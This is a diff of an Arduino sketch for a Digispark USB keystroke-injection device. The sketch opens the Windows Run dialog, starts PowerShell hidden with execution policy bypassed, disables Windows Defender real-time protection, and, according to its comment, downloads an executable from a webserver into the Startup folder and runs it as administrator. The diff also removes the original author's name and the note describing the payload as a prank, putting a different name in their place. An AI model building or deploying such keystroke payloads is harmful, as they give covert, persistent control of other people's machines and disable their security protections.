@@ -1,24 +1,14 @@
 /*
 
-Digispark
-
-Upload .ino to Digispark
-
 Payload: clippy.exe
 
-Decsription: Uses powershell to download payload in "startup" folder. Powershell executes "clippy.exe" as administrator from webserver. Disables Windows Defender. 
+Uses powershell to download payload in "startup" folder. Powershell executes "clippy.exe" as administrator from webserver.
 
-"clippy.exe": Fun joke program creates an annoying Clippy/Clippit Office Assistant popup form Microsoft Word (version 97). Popup every 60 sec created by http://rjlpranks.com/pranks/clippy/ 
+Created by NEDb on 9/2/2019
 
-"clippy.vbs": Fake windows error to deter user from closing powershell (This is no longer included as powershell now runs hidden). 
-
-Created by Tyler Smith on 9/2/2019 at [TIME] - http://DataDucks.3utilities.com/forum - DataDucks.Web.Development@gmail.com
-
-Tested and Refined by Tyler Smith on 9/8/2019 at [10:42 AM]
-
-Final Build on 9/8/2019 at 1:12 AM
-
-Refined by Tyler Smith on 4/10/2020 at [1:25 PM]
+Tested on:
+OS: Windows 10 Pro
+Hardware: ATtiny85
 
 Please see "clippy.txt" for list of phrases.
 
@@ -44,8 +34,7 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN"
       DigiKeyboard.delay(100);
       // Runing powershell
-      //DigiKeyboard.println(F("powershell")); // To see whats going on in powershell - uncomment to use WARNING: WILL NOT RUN ADMINISTRATOR MODE
-      DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
+      DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden
       DigiKeyboard.delay(2000);
       // Disable Windows Defender
       DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
